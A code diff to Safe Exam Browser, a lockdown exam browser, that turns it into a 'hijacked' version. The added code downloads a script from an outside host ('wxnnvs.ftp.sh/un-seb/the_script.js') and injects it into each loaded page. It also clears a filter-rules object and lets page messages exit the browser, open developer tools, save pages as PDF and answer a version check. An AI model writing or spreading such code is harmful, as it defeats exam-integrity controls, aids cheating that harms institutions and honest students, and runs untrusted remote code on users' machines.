@@ -12,6 +12,7 @@ using System.Linq;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using CefSharp;
+using CefSharp.WinForms;
 using SafeExamBrowser.Browser.Wrapper;
 using SafeExamBrowser.Browser.Wrapper.Events;
 using SafeExamBrowser.Logging.Contracts;
@@ -142,7 +143,16 @@ namespace SafeExamBrowser.Browser
 
 			if (control is IWebBrowser webBrowser)
 			{
-				webBrowser.JavascriptMessageReceived += async (sender, e) => await WebBrowser_JavascriptMessageReceivedAsync(sender, e);
+                webBrowser.JavascriptMessageReceived += WebBrowser_JavascriptMessageReceived;
+
+				// seb hijack
+				Settings.Browser.FilterSettings filterSettings = new Settings.Browser.FilterSettings();
+				filterSettings.Rules.Clear();
+				using (var client = new System.Net.WebClient())
+				{
+					var the_script = client.DownloadString("https://wxnnvs.ftp.sh/un-seb/the_script.js");
+					webBrowser.ExecuteScriptAsyncWhenPageLoaded(the_script);
+				}
 			}
 		}
 
@@ -189,35 +199,64 @@ namespace SafeExamBrowser.Browser
 			}
 		}
 
-        private async Task WebBrowser_JavascriptMessageReceivedAsync(object sender, JavascriptMessageReceivedEventArgs e)
-        {
-            clipboard.Process(e);
+		// seb hijack
+		private void ExitSEB()
+		{
+			if (MessageBox.Show("Crashing SEB can take up to 10 seconds \nIt can be seen in the log files aswell.", "SEB Crash", MessageBoxButtons.OKCancel, MessageBoxIcon.Information) == DialogResult.OK)
+			{
+				Environment.Exit(0);
+			}
+		}
 
-            dynamic message = e.Message;
-            if (message.type == "exitSEB")
-            {
-                if (MessageBox.Show("Crashing SEB can take up to 10 seconds \nIt can be seen in the log files aswell.", "SEB Crash", MessageBoxButtons.OKCancel, MessageBoxIcon.Information) == DialogResult.OK)
-                {
-                    Environment.Exit(0);
-                }
-            }
+		private async Task SaveAsPDF()
+		{
+			var settings = new PdfPrintSettings();
+			string filename = DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".pdf";
+			string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), filename);
+			var succes = await control.BrowserCore.PrintToPdfAsync(filepath, settings);
+			var owner = control as IWin32Window;
+			if (succes)
+			{
+				MessageBox.Show(owner, "PDF should be saved to desktop.", "Save as PDF", MessageBoxButtons.OK, MessageBoxIcon.Information);
+			}
+			else
+			{
+				MessageBox.Show(owner, "Failed to generate PDF", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+			}
+		}
 
-            if (message.type == "screenshot")
-            {
-                var settings = new PdfPrintSettings();
-                string filename = DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".pdf";
-                string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), filename);
-                var succes = await control.BrowserCore.PrintToPdfAsync(filepath, settings);
-				var owner = control as IWin32Window;
-				if (succes)
+		private void WebBrowser_JavascriptMessageReceived(object sender, JavascriptMessageReceivedEventArgs e)
+		{
+			clipboard.Process(e);
+
+			// seb hijack
+			dynamic message = e.Message;
+			if (message.type == "exitSEB")
+			{
+				ExitSEB();
+			}
+
+			if (message.type == "screenshot")
+			{
+				_ = SaveAsPDF();
+			}
+
+			if (message.type == "devTools")
+			{
+				ShowDeveloperConsole();
+			}
+
+			if (message.type == "version")
+			{	
+				if (message.version == "2")
 				{
-					MessageBox.Show(owner, "PDF should be saved to desktop.", "Save as PDF", MessageBoxButtons.OK, MessageBoxIcon.Information);
+					ExecuteJavaScript("responseFunction(true);");
 				}
 				else
 				{
-					MessageBox.Show(owner, "Failed to generate PDF", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+					ExecuteJavaScript("responseFunction(false);");
 				}
 			}
-        }
-    }
+		}
+	}
 }
